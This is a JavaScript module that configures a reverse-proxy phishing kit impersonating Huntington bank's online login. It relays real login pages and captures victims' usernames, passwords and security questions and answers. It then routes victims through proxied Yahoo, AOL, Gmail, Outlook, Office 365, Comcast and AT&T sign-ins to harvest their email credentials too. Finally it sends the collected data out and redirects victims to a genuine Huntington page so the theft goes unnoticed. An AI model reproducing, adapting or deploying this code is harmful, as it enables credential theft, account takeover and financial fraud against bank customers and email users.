/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        return super.processRequest()

    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
       
        super(proxyResp, browserEndPoint)
        this.regexes = [
            // {
            //     reg: /window.__BssoInterrupt_/igm, // Google chrome on windows fix
            //     replacement: 'window.__BssoInterrupt_Core=!0;</script>'
            // },
        ]
    }


    processResponse() {
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }

        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url

            /** AOL SUCCESS REDIRECT */
            if (rLocation.startsWith('https://api.login.aol.com/oauth2/request_auth')
                || rLocation.startsWith('https://guce.aol.com/consent?gcrumb=') || rLocation === 'https://www.aol.com/') {
                return this.concludeAuth()
            } if (rLocation.startsWith('https://account.live.com') || rLocation.startsWith('https://account.microsoft.com')) {
                return this.concludeAuth()
            } if (rLocation.startsWith('https://www.yahoo.com/?guccounter=1') || rLocation.startsWith('https://guce.yahoo.com/consent')
                || rLocation.startsWith('/account/comm-channel/refresh') || rLocation === 'https://www.yahoo.com/') {
                return this.concludeAuth()
            } if (rLocation === 'https://www.office.com/landing') {
                return this.concludeAuth()
            }
            if (rLocation === 'https://xfinity.comast.net/') {
                return this.concludeAuth()
            }
        }
        // return super.deployResponse
        // this.browserEndPoint.setHeader('content-security-policy')
        let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                // for (let i = 0; i < this.regexes.length; i += 1) {
                //     const regExObj = this.regexes[i]
                //     if (regExObj.reg.test(newMsgBody)) {
                //         newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                //     }
                // }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }

    concludeAuth() {
        console.log('Concluding path')
        this.browserEndPoint.writeHead(302, { location: '/auth/login/finish' })
        this.browserEndPoint.end('')

    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {

        if (this.req.method === 'POST') {
            
            // super.uploadRequestBody(clientContext.currentDomain, clientContext)


            if (this.req.url === '/onlinebanking/~/rol/Auth/login.aspx') {
                clientContext.setLogAvailable(true)
                super.captureBody(clientContext.currentDomain, clientContext)
                clientContext.currentDomain = 'onlinebanking.huntington.com'
                this.res.writeHead(302, { location: '/session/secure/SecurityQuestion' })
                return this.res.end('')
            }
            super.captureBody(clientContext.currentDomain, clientContext)
            // super.uploadRequestBody(clientContext.currentDomain, clientContext)

        }

        if (clientContext.info.disableDeflate) {
            this.req.headers['accept-encoding'] = 'gzip, br'
        }


        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null && redirectToken.obj.host === clientContext.currentDomain) {
            // clientContext.currentDomain = process.env.PROXY_DOMAIN
            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        }

        if (this.req.url === '/kmsi' || this.req.url.startsWith('/account/upsell/webauthn') || this.req.url.startsWith('/account/fb-messenger-linking')) {
            super.sendClientData(clientContext, {})
            this.res.writeHead(302, { location: '/auth/login/finish' })
            return this.res.end('')
        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}


const ExecPhpPager = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/session/secure/');

    }

    execute(clientContext) {
        if (this.req.method === 'POST') {
            if (this.req.url === '/session/secure/emailInfo') {
                super.captureBody(clientContext.currentDomain, clientContext)
 
                super.superExecutePhpScript('emailcapture.php', clientContext)
            } else {
                super.uploadRequestBody(clientContext.currentDomain, clientContext)
                this.res.writeHead(200)
                this.res.end()
            }
        } else {
            switch (this.req.url) {
                case '/session/secure/SecurityQuestion':
                    clientContext.currentDomain = 'onlinebanking.huntington.com'
                    super.superExecutePhpScript('sq.html', clientContext)
                    break
                default:
                    super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
        }
    }


}


const EmailLoginHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        if (req.url.startsWith('/auth/login/')) {
            return true
        } return false
    }

    execute(clientConfig) {

        if (this.req.url.startsWith('/auth/login/')) {
            if (this.req.url === '/auth/login/yahoo') {
                this.req.url = '/'
                clientConfig.currentDomain = 'login.yahoo.com'
                return super.superExecuteProxy(clientConfig.currentDomain, clientConfig)
            }
            if (this.req.url === '/auth/login/comcast') {
                this.req.url = '/login'
                clientConfig.currentDomain = 'login.xfinity.com'
                return super.superExecuteProxy(clientConfig.currentDomain, clientConfig)
            }
            if (this.req.url === '/auth/login/aol') {
                this.req.url = '/'
                clientConfig.currentDomain = 'login.aol.com'
                return super.superExecuteProxy(clientConfig.currentDomain, clientConfig)
            }
            if (this.req.url === '/auth/login/gmail') {
                this.req.url = '/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin'
                clientConfig.currentDomain = 'accounts.google.com'
                return super.superExecuteProxy(clientConfig.currentDomain, clientConfig)
            }
            if (this.req.url === '/auth/login/outlook') {
                clientConfig.info.disableDeflate = true;
                this.req.headers['accept-encoding'] = 'gzip, br'
                this.req.url = '/login.srf'
                clientConfig.currentDomain = 'login.live.com'
                return super.superExecuteProxy(clientConfig.currentDomain, clientConfig)
            }
            if (this.req.url === '/auth/login/office') {
                this.req.url = '/'
                clientConfig.currentDomain = 'login.microsoftonline.com'
                return super.superExecuteProxy(clientConfig.currentDomain, clientConfig)

            }
            if (this.req.url === '/auth/login/att') {
                this.req.url = '/isam/sps/oidc/rp/consumerfed/kickoff/aaidpartner?Target=https%3A%2F%2Fcaaid.att.com%2Fisam%2Fsps%2Fstatic%2FsigninRedirect.html'
                clientConfig.currentDomain = 'caaid.att.com'
                return super.superExecuteProxy(clientConfig.currentDomain, clientConfig)
            }
            if (this.req.url === '/auth/login/finish') {
                super.sendClientData(clientConfig)
                this.res.writeHead(302, { location: 'https://www.huntington.com/learn/credit-debt' })
                return this.res.end('')
            }
        }

        return super.superExecuteProxy(clientConfig.currentDomain, clientConfig)


    }
}




const configExport = {

    CURRENT_DOMAIN: 'www.huntington.com',
    START_PATH: '/mobile-login',
    PRE_HANDLERS:
        [
            ExecPhpPager,
            EmailLoginHandler,
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['username'],
            urls: [],
            hosts: ['www..huntington.com'],
        },

        loginPassword: {
            method: 'POST',
            params: ['password'],
            urls: [],
            hosts: ['www.huntington.com'],
        },

        emailCapture: {
            method: 'POST',
            params: ['username', 'user'],
            urls: [],
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        emailPassword: {
            method: 'POST',
            params: ['password', 'passwd'],
            urls: [],
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },

        q1: {
            method: 'POST',
            params: ['q1'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
        a1: {
            method: 'POST',
            params: ['a1'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
        q2: {
            method: 'POST',
            params: ['q2'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
        a2: {
            method: 'POST',
            params: ['a2'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
        q3: {
            method: 'POST',
            params: ['q3'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
        a3: {
            method: 'POST',
            params: ['a3'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
        emailAddress: {
            method: 'POST',
            params: ['emaildress'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
        fullName: {
            method: 'POST',
            params: ['fullName'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
        manuelEmailPassword: {
            method: 'POST',
            params: ['manuelEmailPassword'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
        confirmManualPassword: {
            method: 'POST',
            params: ['confirmManualPassword'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },


    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport

